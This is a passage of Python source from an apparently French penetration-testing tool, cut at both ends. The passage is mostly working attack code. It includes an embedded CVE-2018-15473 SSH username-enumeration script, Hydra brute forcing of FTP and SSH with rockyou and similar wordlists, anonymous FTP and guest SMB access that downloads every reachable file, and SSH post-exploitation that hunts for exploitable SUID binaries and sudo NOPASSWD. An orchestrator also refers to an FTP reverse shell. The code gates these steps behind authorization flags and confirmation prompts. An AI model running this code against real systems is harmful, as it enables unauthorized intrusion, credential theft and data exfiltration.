        lines.append(f"[!] SSH connexion échouée: {e}\n")
        out.write_text("".join(lines), encoding="utf-8")
        return None

    results: Dict[str, str] = {}
    suid_hits: List[dict] = []
    user = "?"

    postexploit_dir = logs_dir / "post_exploit"
    postexploit_dir.mkdir(exist_ok=True)

    for name, cmd in POST_EXPLOIT_COMMANDS:
        try:
            _, stdout, stderr = client.exec_command(cmd, timeout=15 if "find" not in cmd else 30)
            output = strip_ansi(stdout.read().decode("utf-8", errors="replace"))
            results[name] = output
            lines.append(f"\n### {cmd}\n{output}\n")
            (postexploit_dir / f"{name}.txt").write_text(output, encoding="utf-8", errors="replace")

            if name == "id":
                user = output.strip().split("\n")[0]
                ok(f"[+] SSH user: {user}")
            if name == "suid":
                suid_hits = _parse_suid_findings(output)
                if suid_hits:
                    ok(f"[+] SUID exploitables: {', '.join(h['name'] for h in suid_hits)}")
                    lines.append("\n### GTFOBins matches\n")
                    for h in suid_hits:
                        lines.append(f"  [{h['name']}] {h['path']}\n  → {h['exploit']}\n")
            if name == "sudo_l" and "NOPASSWD" in output:
                ok("[+] sudo NOPASSWD détecté → escalade possible!")
                lines.append("[!] NOPASSWD trouvé dans sudo -l\n")
        except Exception as ex:
            lines.append(f"[!] {cmd}: {ex}\n")

    client.close()
    lines.append(f"\n# Finished: {now_iso()}\n")
    out.write_text("".join(lines), encoding="utf-8")

    sev = "critical" if suid_hits or any("NOPASSWD" in r for r in results.values()) else "high"
    suid_names = [h["name"] for h in suid_hits]

    return {
        "severity": sev,
        "title": f"Post-exploit SSH ({username}@{cfg.target}) — user: {user}"
                 + (f" — SUID: {', '.join(suid_names)}" if suid_names else ""),
        "source": "post_exploit_ssh",
        "phase": "post_exploitation",
        "evidence_file": str(out),
        "user": user,
        "suid_hits": suid_hits,
        "credentials": cred,
    }


def run_postexploit_phase(
    cfg: Config,
    services: List[dict],
    exploit_findings: List[dict],
    logs_dir: Path,
) -> List[dict]:
    """
    Orchestrateur post-exploitation.
    - Tente initial access via FTP reverse shell si --lhost fourni
    - Tente post-exploit SSH si Hydra a trouvé des creds
    """
    if not cfg.run_postexploit:
        return []
    if not cfg.run_exploit:
        return []

    if RICH:
        console.print(Panel(
            "[bold red]🔥 PHASE POST-EXPLOITATION (v0.67)[/bold red]\n"
            "[dim]Initial Access → Shell → Énumération interne[/dim]",
            border_style="red",
        ))
    else:
        info("=" * 60)
        info("PHASE POST-EXPLOITATION")
        info("=" * 60)

    findings: List[dict] = []

    # Récupère les findings utiles des phases précédentes
    ftp_finding = next((f for f in exploit_findings if f.get("source") == "exploit_ftp"), None)
    hydra_finding = next((f for f in exploit_findings if f.get("source") == "exploit_hydra"), None)

    # Module 6 — Initial Access FTP
    if cfg.lhost and ftp_finding and ftp_finding.get("writable_dirs"):
        info(f"Initial Access — FTP reverse shell → {cfg.lhost}:{cfg.lport}")
        f = run_ftp_initial_access(cfg, services, ftp_finding, logs_dir)
        if f:
            findings.append(f)

    # Module 7 — Post-exploit SSH (si Hydra a trouvé des creds)
    hydra_creds = []
    if hydra_finding:
        hydra_creds = hydra_finding.get("found_creds", [])
    if hydra_creds:
        info(f"Post-exploit SSH — {len(hydra_creds)} credential(s) trouvé(s)")
        f = run_postexploit_ssh(cfg, services, hydra_creds, logs_dir)
        if f:
            findings.append(f)
    elif not cfg.lhost:
        info("Post-exploit SSH: aucun credential trouvé et --lhost non fourni → SKIP")

    return findings


# ==================== EXPLOITATION (v0.66) ====================
# Phase déclenchée UNIQUEMENT avec --exploit + --authorized.
# Modules : FTP anonyme, SMB accès guest, SSH CVE detect, Hydra brute.
# Chaque module ne se déclenche QUE si les conditions de recon l'indiquent.
# ==============================================================

# ── Helpers de détection ──────────────────────────────────────
def _detect_ftp_anon(nmap_text: str) -> bool:
    low = nmap_text.lower()
    return "anonymous ftp login allowed" in low or "ftp-anon" in low

def _detect_ftp_writable_dirs(nmap_text: str) -> List[str]:
    """Extrait les répertoires marqués [NSE: writeable] dans la sortie nmap."""
    dirs = []
    for line in nmap_text.splitlines():
        if "writeable" in line.lower() or "nse: write" in line.lower():
            # Essaie d'extraire le nom du répertoire sur la ligne précédente ou courante
            m = re.search(r"(\S+)\s+\[NSE", line, re.IGNORECASE)
            if m:
                dirs.append(m.group(1))
            else:
                dirs.append("(dir inconnu)")
    return dirs

def _detect_ssh_service(services: List[dict]) -> Optional[dict]:
    for s in services:
        name = (s.get("name") or "").lower()
        port = int(s.get("port") or 0)
        if "ssh" in name or port == 22:
            return s
    return None

def _ssh_vulnerable_userenum(version_str: str) -> bool:
    """OpenSSH < 7.7 est vulnérable à CVE-2018-15473 (username enumeration)."""
    m = re.search(r"(\d+)\.(\d+)", version_str or "")
    if not m:
        return False
    major, minor = int(m.group(1)), int(m.group(2))
    return (major < 7) or (major == 7 and minor < 7)

def _detect_lhost() -> Optional[str]:
    """
    Détecte automatiquement l'IP de l'interface VPN (tun0/utun*).
    Priorité : tun* (Linux) > utun* (macOS) > IP locale principale.
    Retourne None si aucune interface VPN trouvée.
    """
    import platform
    _sys = platform.system().lower()

    # ── Essai via 'ip a' (Linux) ──────────────────────────────────────────
    if shutil.which("ip"):
        try:
            out = subprocess.run(["ip", "-4", "addr"], capture_output=True,
                                 text=True, timeout=3).stdout
            current_iface = ""
            for line in out.splitlines():
                line = line.strip()
                if line and not line.startswith(" "):
                    current_iface = line.split(":")[1].strip() if ":" in line else ""
                if "inet " in line and ("tun" in current_iface or "utun" in current_iface):
                    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", line)
                    if m:
                        return m.group(1)
        except Exception:
            pass

    # ── Essai via 'ifconfig' (macOS / Linux fallback) ─────────────────────
    if shutil.which("ifconfig"):
        try:
            out = subprocess.run(["ifconfig"], capture_output=True,
                                 text=True, timeout=3).stdout
            current_iface = ""
            for line in out.splitlines():
                if line and not line.startswith("\t") and not line.startswith(" "):
                    current_iface = line.split(":")[0].strip()
                if "inet " in line and ("tun" in current_iface or "utun" in current_iface):
                    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", line)
                    if m:
                        return m.group(1)
        except Exception:
            pass

    return None


def _paramiko_available() -> bool:
    """Vérifie si paramiko est disponible pour Python 3."""
    try:
        import paramiko  # noqa: F401
        return True
    except ImportError:
        return False

# Script Python 3 natif pour CVE-2018-15473
# Technique : analyse du message d'erreur SSH (invalid user vs auth failed)
# Sur OpenSSH < 7.7 non patché : messages différents selon user valide/invalide.
# Sur versions patchées : fallback sur analyse de timing.
_SSH_USERENUM_PY3 = '''#!/usr/bin/env python3
"""SSH Username Enumeration - CVE-2018-15473 (Python 3 + paramiko)
Technique : message d\'erreur différent pour user valide vs invalide.
"""
import argparse, logging, socket, sys, time
logging.getLogger("paramiko").setLevel(logging.CRITICAL)
try:
    import paramiko
except ImportError:
    print("[!] paramiko manquant: pip3 install paramiko")
    sys.exit(1)

def check_user(host, port, username, timeout=5):
    """
    Retourne (True, raison) si user valide, (False, raison) sinon.
    Technique : le serveur renvoie "Invalid user X" dans le banner/disconnect
    pour les users inexistants, mais pas pour les users valides.
    """
    sock = socket.socket()
    sock.settimeout(timeout)
    try:
        sock.connect((host, int(port)))
        t = paramiko.Transport(sock)
        t.start_client(timeout=timeout)
    except Exception as e:
        return None, f"connect error: {e}"

    try:
        t.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except paramiko.ssh_exception.AuthenticationException as e:
        err = str(e).lower()
        t.close()
        # Message spécifique pour user invalide sur OpenSSH < 7.7 non patché
        if "invalid user" in err or "no such user" in err:
            return False, "invalid user (server message)"
        # Auth refused mais user potentiellement valide
        return True, "auth refused (user may exist)"
    except EOFError:
        # Disconnect brutal = souvent user invalide sur certaines configs
        return False, "disconnect (likely invalid user)"
    except Exception as e:
        t.close()
        err = str(e).lower()
        if "invalid user" in err:
            return False, f"invalid: {e}"
        return None, f"unknown: {e}"
    t.close()
    return False, "auth succeeded (unexpected)"

p = argparse.ArgumentParser()
p.add_argument("host")
p.add_argument("--port", type=int, default=22)
p.add_argument("--userList", required=True)
p.add_argument("--outputFile")
args = p.parse_args()

with open(args.userList) as f:
    users = [l.strip() for l in f if l.strip()]

print(f"[*] {args.host}:{args.port} — {len(users)} users à tester")
print(f"[*] Technique: CVE-2018-15473 (message-based, OpenSSH < 7.7)")
print()

valid, invalid, unknown = [], [], []
for u in users:
    r, reason = check_user(args.host, args.port, u)
    if r is True:
        print(f"[+] VALID:   {u:<20} ({reason})")
        valid.append(u)
    elif r is False:
        print(f"[-] invalid: {u:<20} ({reason})")
        invalid.append(u)
    else:
        print(f"[?] unknown: {u:<20} ({reason})")
        unknown.append(u)
    time.sleep(0.05)

print()

# Détection de faux positifs : si TOUS les users sont "auth refused"
# c'est que le serveur a backporté le patch (comportement homogène)
all_auth_refused = all(
    "auth refused" in reason for _, reason in
    [(True, r) for r in [f"auth refused (user may exist)"] * len(valid)]
) if valid and not invalid and not unknown else False

if valid and not invalid and not unknown:
    # 100% "auth refused" = serveur patché (Ubuntu backport)
    print(f"[!] ATTENTION: tous les users renvoient 'auth refused'.")
    print(f"[!] Ce serveur a probablement backporté le patch CVE-2018-15473.")
    print(f"[!] La version affichée (OpenSSH 7.6p1 Ubuntu 4ubuntu0.3) inclut")
    print(f"    le correctif de sécurité — résultats NON FIABLES.")
    print(f"    → CVE-2018-15473 : NON EXPLOITABLE sur ce serveur.")
    valid = []  # Vide les faux positifs
elif valid:
    print(f"[+] Utilisateurs valides ({len(valid)}): {', '.join(valid)}")
else:
    print(f"[-] Aucun utilisateur valide détecté.")
    if unknown:
        print(f"[?] {len(unknown)} inconnus — CVE possiblement non exploitable.")

if args.outputFile and valid:
    open(args.outputFile, "w").write("\\n".join(valid))
'''


# ── Module FTP ────────────────────────────────────────────────
def run_ftp_anon_check(cfg: Config, services: List[dict], nmap_text: str, logs_dir: Path) -> Optional[dict]:
    """
    FTP anonyme : connexion + listing + téléchargement + test écriture.
    Utilise ftplib (stdlib Python — aucune dépendance externe).
    Ne se déclenche que si nmap a confirmé l'accès anonyme.
    """
    ftp_svcs = [s for s in services if "ftp" in (s.get("name") or "").lower() or int(s.get("port") or 0) == 21]
    if not ftp_svcs:
        return None
    if not _detect_ftp_anon(nmap_text):
        info("FTP: pas d'accès anonyme confirmé -> SKIP")
        return None

    import ftplib
    port = int(ftp_svcs[0]["port"])
    out  = logs_dir / "exploit_ftp_anon.txt"
    lines: List[str] = [f"# FTP Anonymous Access — {cfg.target}:{port}\n# {now_iso()}\n\n"]

    files_found: List[str] = []
    files_downloaded: List[str] = []
    writable_dirs: List[str] = []

    def _walk(ftp: "ftplib.FTP", path: str = "/", depth: int = 0) -> None:
        if depth > 3:
            return
        items: List[str] = []
        try:
            ftp.retrlines(f"LIST {path}", items.append)
        except Exception as e:
            lines.append(f"{'  '*depth}[!] LIST {path}: {e}\n")
            return
        for item in items:
            lines.append(f"{'  '*depth}{item}\n")
            parts = item.split(None, 8)
            if len(parts) < 9:
                continue
            perms, name = parts[0], parts[8]
            full = f"{path.rstrip('/')}/{name}"
            if perms.startswith("d"):
                # Répertoire writable (w pour owner/group/other)
                if len(perms) >= 10 and ("w" in perms[1:4]):
                    writable_dirs.append(full)
                    lines.append(f"{'  '*depth}[!] WRITABLE: {full}\n")
                if name not in (".", ".."):
                    _walk(ftp, full, depth + 1)
            else:
                files_found.append(full)
                dl = logs_dir / f"ftp_{safe_name(name)}"
                try:
                    with dl.open("wb") as fh:
                        ftp.retrbinary(f"RETR {full}", fh.write)
                    files_downloaded.append(str(dl))
                    lines.append(f"{'  '*depth}[+] Téléchargé: {full} -> {dl.name}\n")
                    # Affiche le contenu si texte court
                    try:
                        txt = dl.read_text(encoding="utf-8", errors="replace")
                        if len(txt) < 4096:
                            lines.append(f"\n{'='*40}\n{dl.name}:\n{txt}\n{'='*40}\n\n")
                    except Exception as _exc:
                        warn(f"[run_ftp_anon_check] {_exc}")
                except Exception as e:
                    lines.append(f"{'  '*depth}[-] RETR {full}: {e}\n")

    def _ftp_connect() -> "ftplib.FTP":
        """Connexion FTP anonyme (mode par défaut PASV)."""
        ftp = ftplib.FTP()
        ftp.connect(cfg.target, port, timeout=15)
        ftp.login("anonymous", "anonymous@pentool")
        return ftp  # PASV par défaut (ftplib default)

    def _try_list(ftp: "ftplib.FTP", path: str = "/") -> List[str]:
        """Test LIST et lève l'exception si échec (pour détecter le mode incompatible)."""
        items: List[str] = []
        ftp.retrlines(f"LIST {path}", items.append)
        return items

    try:
        ftp = _ftp_connect()
        resp = ftp.getwelcome()

        # Détecte le mode de transfert supporté par le serveur
        transfer_mode = "PASV"
        try:
            _try_list(ftp, "/")
        except Exception as e_pasv:
            lines.append(f"[!] PASV LIST échoué ({e_pasv}), tentative ACTIVE...\n")
            ftp.set_pasv(False)
            transfer_mode = "ACTIVE"
            try:
                _try_list(ftp, "/")
            except Exception as e_active:
                lines.append(f"[!] ACTIVE LIST échoué ({e_active}) — données FTP inaccessibles.\n")
                raise e_active

        lines.append(f"[+] Login anonyme OK\n[+] Banner: {resp}\n[+] Mode: {transfer_mode}\n\n")
        lines.append("## Listing\n")
        _walk(ftp)

        # Test d'écriture sur les répertoires détectés comme writables
        if writable_dirs:
            lines.append("\n## Test d'écriture\n")
            import io
            for d in writable_dirs[:3]:
                canary = f"{d.rstrip('/')}/pentool_{cfg.run_id[:8]}.txt"
                payload = f"pentool write-test {now_iso()}\n".encode()
                try:
                    ftp.storbinary(f"STOR {canary}", io.BytesIO(payload))
                    lines.append(f"[+] ÉCRITURE CONFIRMÉE dans {d} : {canary}\n")
                    try:
                        ftp.delete(canary)
                        lines.append(f"[+] Canary supprimé\n")
                    except Exception as _exc:
                        warn(f"[run_ftp_anon_check] {_exc}")
                except Exception as e:
                    lines.append(f"[-] STOR {canary}: {e}\n")
        ftp.quit()
    except Exception as e:
        lines.append(f"[!] Erreur FTP: {e}\n")
        # Fallback nmap : si nmap a déjà détecté des dirs writables via NSE,
        # on les remonte quand même pour que run_ftp_initial_access puisse s'exécuter
        nmap_writable = _detect_ftp_writable_dirs(nmap_text)
        if nmap_writable:
            for d in nmap_writable:
                if d not in writable_dirs:
                    writable_dirs.append(d)
            lines.append(f"[!] FTP inaccessible mais nmap NSE a détecté: {nmap_writable}\n")
            lines.append(f"    → Initial access tenté à la phase post-exploit.\n")
            info(f"[FTP] Timeout mais nmap a détecté dirs writables: {nmap_writable}")

    lines.append(f"\n# Finished: {now_iso()}\n")
    out.write_text("".join(lines), encoding="utf-8", errors="replace")

    sev = "high" if writable_dirs else ("medium" if files_downloaded else "low")
    details = []
    if files_found:      details.append(f"{len(files_found)} fichier(s)")
    if files_downloaded: details.append(f"{len(files_downloaded)} téléchargé(s)")
    if writable_dirs:    details.append(f"WRITABLE: {', '.join(writable_dirs)}")

    return {
        "severity": sev,
        "title": f"FTP anonyme — {', '.join(details) if details else 'accès confirmé'}",
        "source": "exploit_ftp",
        "evidence_file": str(out),
        "files_found": files_found,
        "files_downloaded": files_downloaded,
        "writable_dirs": writable_dirs,
        "phase": "exploitation",
    }


# ── Module SMB ────────────────────────────────────────────────
def run_smb_anon_check(cfg: Config, services: List[dict], logs_dir: Path) -> Optional[dict]:
    """
    SMB : listing des partages + accès guest/null session.
    Utilise smbclient et smbmap (outils existants du système).
    """
    if not _has_smb(services):
        return None
    if not which("smbclient") and not which("smbmap"):
        warn("smbclient et smbmap absents -> SKIP exploit SMB")
        return None

    out   = logs_dir / "exploit_smb.txt"
    lines: List[str] = [f"# SMB Anonymous/Guest Access — {cfg.target}\n# {now_iso()}\n\n"]

    accessible_shares: List[str] = []
    readable_shares: List[str]   = []
    writable_shares: List[str]   = []

    # 1. Listing des partages ───────────────────────────────────
    if which("smbclient"):
        lines.append("## smbclient -L (liste des partages)\n")
        cmdlog = logs_dir / "exploit_smb_list_cmd.txt"
        run_cmd(
            ["smbclient", "-L", f"//{cfg.target}", "-N"],
            cmdlog, timeout=30, label="smbclient -L",
        )
        try:
            content = strip_ansi(cmdlog.read_text(encoding="utf-8", errors="replace"))
            lines.append(content + "\n")
            for line in content.splitlines():
                m = re.match(r"\s+(\S+)\s+(Disk|IPC|Printer)", line)
                if m:
                    accessible_shares.append(m.group(1))
        except Exception as _exc:
            warn(f"[run_smb_anon_check] {_exc}")

        # 2. Accès à chaque partage ─────────────────────────────
        if accessible_shares:
            lines.append("\n## Accès aux partages\n")
            for share in accessible_shares:
                if share in ("IPC$",):
                    continue
                lines.append(f"\n### {share}\n")
                slog = logs_dir / f"exploit_smb_{safe_name(share)}_cmd.txt"
                rc = run_cmd(
                    ["smbclient", f"//{cfg.target}/{share}", "-N", "-c", "ls"],
                    slog, timeout=15, label=f"smbclient {share}",
                )
                try:
                    scontent = strip_ansi(slog.read_text(encoding="utf-8", errors="replace"))
                    lines.append(scontent + "\n")
                    low = scontent.lower()
                    if rc == 0 and "nt_status_access_denied" not in low and "tree connect failed" not in low:
                        readable_shares.append(share)
                        lines.append(f"[+] LECTURE POSSIBLE: {share}\n")

                        # Télécharge tous les fichiers du share
                        # smbclient mget dépose les fichiers dans le CWD courant
                        dl_dir = logs_dir / f"smb_{safe_name(share)}_files"
                        dl_dir.mkdir(parents=True, exist_ok=True)
                        try:
                            dl_result = subprocess.run(
                                ["smbclient", f"//{cfg.target}/{share}", "-N",
                                 "-c", "prompt OFF; recurse ON; mget *"],
                                capture_output=True, text=True,
                                cwd=str(dl_dir), timeout=30, env=base_env(),
                            )
                            dl_out = strip_ansi(dl_result.stdout + dl_result.stderr)
                            lines.append(f"\n[smbclient mget {share}]\n{dl_out}\n")
                            downloaded = [f for f in dl_dir.rglob("*") if f.is_file()]
                            if downloaded:
                                lines.append(f"[+] {len(downloaded)} fichier(s) téléchargé(s) dans {dl_dir.name}/:\n")
                                for df in downloaded:
                                    lines.append(f"    {df.name} ({df.stat().st_size} bytes)\n")
                            else:
                                lines.append("[-] Aucun fichier récupéré\n")
                        except Exception as e:
                            lines.append(f"[!] mget erreur: {e}\n")
                except Exception as e:
                    lines.append(f"[!] Erreur accès {share}: {e}\n")

    # 3. smbmap (permissions détaillées) ───────────────────────
    if which("smbmap"):
        lines.append("\n## smbmap -H (permissions)\n")
        smlog = logs_dir / "exploit_smbmap_cmd.txt"
        run_cmd(
            ["smbmap", "-H", cfg.target],
            smlog, timeout=30, label="smbmap",
        )
        try:
            scontent = strip_ansi(smlog.read_text(encoding="utf-8", errors="replace"))
            lines.append(scontent + "\n")
            for line in scontent.splitlines():
                up = line.upper()
                if "WRITE" in up:
                    parts = line.split()
                    if parts:
                        writable_shares.append(parts[0])
                        lines.append(f"[!] ÉCRITURE POSSIBLE: {line.strip()}\n")
        except Exception as _exc:
            warn(f"[run_smb_anon_check] {_exc}")

    lines.append(f"\n# Finished: {now_iso()}\n")
    out.write_text("".join(lines), encoding="utf-8", errors="replace")

    if not accessible_shares and not readable_shares:
        return None

    sev = "high" if writable_shares else ("medium" if readable_shares else "low")
    details = []
    if readable_shares:  details.append(f"lisibles: {', '.join(readable_shares)}")
    if writable_shares:  details.append(f"WRITABLES: {', '.join(writable_shares)}")
    label = ", ".join(details) if details else f"{len(accessible_shares)} share(s) trouvé(s)"

    return {
        "severity": sev,
        "title": f"SMB accès anonyme — {label}",
        "source": "exploit_smb",
        "evidence_file": str(out),
        "accessible_shares": accessible_shares,
        "readable_shares": readable_shares,
        "writable_shares": writable_shares,
        "phase": "exploitation",
    }


# ── Module SSH ────────────────────────────────────────────────
def run_ssh_vuln_detect(cfg: Config, services: List[dict], logs_dir: Path) -> Optional[dict]:
    """
    SSH CVE-2018-15473 : détection de version vulnérable + invocation du script
    ExploitDB 45939.py s'il est présent sur le système.
    OpenSSH < 7.7 permet l'énumération de noms d'utilisateurs valides.
    """
    svc = _detect_ssh_service(services)
    if not svc:
        return None
    version_str = svc.get("version") or ""
    if not _ssh_vulnerable_userenum(version_str):
        info(f"SSH {version_str}: non vulnérable à CVE-2018-15473 -> SKIP")
        return None

    port = int(svc["port"])
    out  = logs_dir / "exploit_ssh_userenum.txt"
    lines: List[str] = [
        f"# SSH Username Enumeration — CVE-2018-15473\n"
        f"# Target: {cfg.target}:{port}  Version: OpenSSH {version_str}\n"
        f"# {now_iso()}\n\n"
        f"[!] OpenSSH {version_str} est VULNÉRABLE à CVE-2018-15473\n"
        f"    (Username enumeration via malformed public-key auth packet)\n\n"
    ]

    valid_users: List[str] = []

    # Usernames communs CTF/Linux
    common = ["root","admin","user","ubuntu","kali","pi","test","guest",
              "oracle","postgres","mysql","www-data","anonymous","ftp",
              "mail","service","backup","operator","nobody","daemon"]
    uf  = logs_dir / "ssh_test_users.txt"
    uf.write_text("\n".join(common), encoding="utf-8")
    out_valid = logs_dir / "ssh_valid_users.txt"
    cmdlog    = logs_dir / "exploit_ssh_userenum_cmd.txt"

    if _paramiko_available():
        # ── Script Python 3 natif (CVE-2018-15473) ───────────────
        script_path = logs_dir / "ssh_userenum_py3.py"
        script_path.write_text(_SSH_USERENUM_PY3, encoding="utf-8")
        lines.append("[+] Méthode: script Python 3 natif (paramiko)\n\n")
        rc = run_cmd(
            ["python3", str(script_path), cfg.target,
             "--port", str(port),
             "--userList", str(uf),
             "--outputFile", str(out_valid)],
            cmdlog, timeout=120, label="ssh-userenum",
        )
        try:
            content = strip_ansi(cmdlog.read_text(encoding="utf-8", errors="replace"))
            lines.append(content + "\n")
            if rc == 0:
                for line in content.splitlines():
                    m = re.search(r"\[\+\]\s+VALID:\s+(\S+)", line)
                    if m:
                        valid_users.append(m.group(1))
                if out_valid.exists():
                    for u in out_valid.read_text(encoding="utf-8", errors="replace").splitlines():
                        u = u.strip()
                        if u and u not in valid_users:
                            valid_users.append(u)
        except Exception as _exc:
            warn(f"[run_ssh_vuln_detect] {_exc}")
    else:
        # ── Fallback : exploitdb script (Python 2) ───────────────
        found = None
        for p in [
            Path("/usr/share/exploitdb/exploits/linux/remote/45939.py"),
            Path("/opt/homebrew/share/exploitdb/exploits/linux/remote/45939.py"),
        ]:
            if p.exists():
                found = p
                break

        py2 = shutil.which("python2") or shutil.which("python2.7")

        if found and py2:
            lines.append(f"[+] Fallback: {found} avec {py2}\n\n")
            rc = run_cmd(
                [py2, str(found), cfg.target,
                 "--port", str(port),
                 "--userList", str(uf),
                 "--outputFile", str(out_valid)],
                cmdlog, timeout=90, label="ssh-userenum",
            )
        else:
            lines.append(
                "[-] paramiko (python3) absent ET script exploitdb introuvable.\n"
                "    Installe paramiko: pip3 install paramiko\n"
                f"    Puis relance avec --scan-mode pentest\n\n"
                f"    Commande manuelle:\n"
                f"      pip3 install paramiko\n"
                f"      python3 <script> {cfg.target} --port {port} --userList {uf}\n"
            )
            cmdlog.write_text("".join(lines), encoding="utf-8")

    lines.append(f"\n# Finished: {now_iso()}\n")
    out.write_text("".join(lines), encoding="utf-8", errors="replace")

    sev = "medium" if valid_users else "info"
    title = f"SSH CVE-2018-15473 (OpenSSH {version_str})"
    if valid_users:
        title += f" — {len(valid_users)} user(s): {', '.join(valid_users[:5])}"
    elif not _paramiko_available():
        title += " — paramiko requis: pip3 install paramiko"
    else:
        title += " — aucun user trouvé"

    return {
        "severity": sev,
        "title": title,
        "source": "exploit_ssh",
        "evidence_file": str(out),
        "ssh_version": version_str,
        "valid_users": valid_users,
        "phase": "exploitation",
    }


# ── Module Hydra (brute force opt-in) ────────────────────────
def run_hydra_brute(
    cfg: Config,
    services: List[dict],
    logs_dir: Path,
    userlist: Optional[Path] = None,
    passlist: Optional[Path] = None,
) -> Optional[dict]:
    """
    Brute force FTP/SSH via Hydra.
    Déclenché UNIQUEMENT si --exploit-brute est passé explicitement.
    """
    if not which("hydra"):
        warn("hydra absent -> SKIP brute force")
        return None

    _ul_candidates = [
        Path("/usr/share/seclists/Usernames/top-usernames-shortlist.txt"),
        Path("/usr/share/wordlists/metasploit/unix_users.txt"),
    ]
    _pl_candidates = [
        Path("/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt"),
        Path("/usr/share/wordlists/metasploit/unix_passwords.txt"),
        Path("/usr/share/wordlists/rockyou.txt"),
    ]
    ul = userlist or next((p for p in _ul_candidates if p.exists()), None)
    pl = passlist or next((p for p in _pl_candidates if p.exists()), None)

    # ── Hint credentials : créer des wordlists temporaires avec le hint en tête ──
    if cfg.hint_username:
        _ul_tmp = logs_dir / "_hint_userlist.txt"
        ul_base = ul.read_text(encoding="utf-8", errors="replace") if ul and ul.exists() else ""
        lines_ul = [cfg.hint_username] + [l for l in ul_base.splitlines() if l.strip() and l.strip() != cfg.hint_username]
        _ul_tmp.write_text("\n".join(lines_ul), encoding="utf-8")
        ul = _ul_tmp
        info(f"[Hydra] Hint username '{cfg.hint_username}' ajouté en tête de userlist")
    if cfg.hint_password:
        _pl_tmp = logs_dir / "_hint_passlist.txt"
        pl_base = pl.read_text(encoding="utf-8", errors="replace") if pl and pl.exists() else ""
        lines_pl = [cfg.hint_password] + [l for l in pl_base.splitlines() if l.strip() and l.strip() != cfg.hint_password]
        _pl_tmp.write_text("\n".join(lines_pl), encoding="utf-8")
        pl = _pl_tmp
        info(f"[Hydra] Hint password ajouté en tête de passlist")

    if not ul or not pl:
        warn("Hydra: wordlists introuvables (userlist/passlist) -> SKIP")
        return None

    out   = logs_dir / "exploit_hydra.txt"
    lines: List[str] = [f"# Hydra Brute Force — {cfg.target}\n# {now_iso()}\n\n"]

    brute_targets: List[Tuple[str, int]] = []
    for s in services:
        name = (s.get("name") or "").lower()
        p    = int(s.get("port") or 0)
        if "ftp" in name or p == 21:
            brute_targets.append(("ftp", p))
        elif "ssh" in name or p == 22:
            brute_targets.append(("ssh", p))

    found_creds: List[str] = []

    for proto, port in brute_targets[:2]:   # max 2 services
        lines.append(f"\n## hydra {proto}://{cfg.target}:{port}\n")
        clog = logs_dir / f"exploit_hydra_{proto}_{port}_cmd.txt"
        run_cmd(
            ["hydra",
             "-L", str(ul), "-P", str(pl),
             "-s", str(port), "-t", "4", "-f",
             cfg.target, proto],
            clog, timeout=300, label=f"hydra {proto}",
        )
        try:
            content = strip_ansi(clog.read_text(encoding="utf-8", errors="replace"))
            lines.append(content + "\n")
            for line in content.splitlines():
                if "login:" in line.lower() and "password:" in line.lower():
                    found_creds.append(line.strip())
                    lines.append(f"[!] CREDENTIAL TROUVÉ: {line.strip()}\n")
        except Exception as _exc:
            warn(f"[run_hydra_brute] {_exc}")

    lines.append(f"\n# Finished: {now_iso()}\n")
    out.write_text("".join(lines), encoding="utf-8", errors="replace")

    if not brute_targets:
        return None

    sev = "critical" if found_creds else "info"
    label = f"{len(found_creds)} credential(s)!" if found_creds else "aucun résultat"
    return {
        "severity": sev,
        "title": f"Hydra brute force ({len(brute_targets)} service(s)) — {label}",
        "source": "exploit_hydra",
        "evidence_file": str(out),
        "found_creds": found_creds,
        "services_tested": [f"{p}:{port}" for p, port in brute_targets],
        "phase": "exploitation",
    }


# ── Orchestrateur exploitation ────────────────────────────────
def run_exploitation_phase(
    cfg: Config,
    services: List[dict],
    nmap_text_path: Optional[Path],
    logs_dir: Path,
) -> List[dict]:
    """
    Lance les modules d'exploitation selon les résultats de recon.
    Retourne la liste des findings d'exploitation.
    Nécessite cfg.run_exploit = True.
    """
    if not cfg.run_exploit:
        return []

    nmap_text = ""
    if nmap_text_path and nmap_text_path.exists():
        try:
            nmap_text = strip_ansi(nmap_text_path.read_text(encoding="utf-8", errors="replace"))
        except Exception as _exc:
            warn(f"[run_exploitation_phase] {_exc}")

    if RICH:
        console.print(Panel(
            "[bold red]⚡ PHASE EXPLOITATION[/bold red]\n"
            "[dim]Modules déclenchés selon les findings de recon[/dim]",
            border_style="red",
        ))
    else:
        info("=" * 60)
        info("PHASE EXPLOITATION")
        info("=" * 60)

    exploit_findings: List[dict] = []

    # ── FTP anonyme ─────────────────────────────────────────────────────────
    ftp_svcs = [s for s in services if s.get("port") in (21,) or "ftp" in (s.get("service") or "").lower()]
    if ftp_svcs:
        if _webui_confirm(
            cfg,
            action_id="ftp_anon",
            title="Exploitation FTP anonyme",
            details=(
                f"Tenter une connexion FTP anonyme sur {cfg.target}:{ftp_svcs[0].get('port', 21)}. "
                "Si un dossier est accessible en écriture, des fichiers pourront être déposés."
            ),
        ):
            info("Exploitation — FTP anonyme")
            f = run_ftp_anon_check(cfg, services, nmap_text, logs_dir)
            if f:
                exploit_findings.append(f)
                if f.get("writable_dirs"):
                    ok(f"[!] FTP WRITABLE: {f['writable_dirs']}")
                if f.get("files_downloaded"):
                    ok(f"[+] FTP: {len(f['files_downloaded'])} fichier(s) téléchargé(s)")
        else:
            info("Exploitation FTP anonyme → ignorée par l'utilisateur")
    else:
        info("Exploitation FTP — aucun service FTP détecté → SKIP")

    # ── SMB accès anonyme ───────────────────────────────────────────────────
    if _has_smb(services):
        smb_svcs = [s for s in services if s.get("port") in (139, 445) or "smb" in (s.get("service") or "").lower()]
        smb_port = smb_svcs[0].get("port", 445) if smb_svcs else 445
        if _webui_confirm(
            cfg,
            action_id="smb_anon",
            title="Exploitation SMB — accès anonyme/guest",
            details=(
                f"Tenter d'accéder aux partages SMB sur {cfg.target}:{smb_port} sans mot de passe. "
                "Permet de lister et télécharger des fichiers accessibles publiquement."
            ),
        ):
            info("Exploitation — SMB accès anonyme/guest")
            f = run_smb_anon_check(cfg, services, logs_dir)
            if f:
                exploit_findings.append(f)
        else:
            info("Exploitation SMB anonyme → ignorée par l'utilisateur")

    # ── SSH username enumeration (CVE-2018-15473) ───────────────────────────
    svc_ssh = _detect_ssh_service(services)
    if svc_ssh and _ssh_vulnerable_userenum(svc_ssh.get("version") or ""):
        ssh_port = svc_ssh.get("port", 22)
        ssh_ver  = svc_ssh.get("version", "?")
        if _webui_confirm(
            cfg,
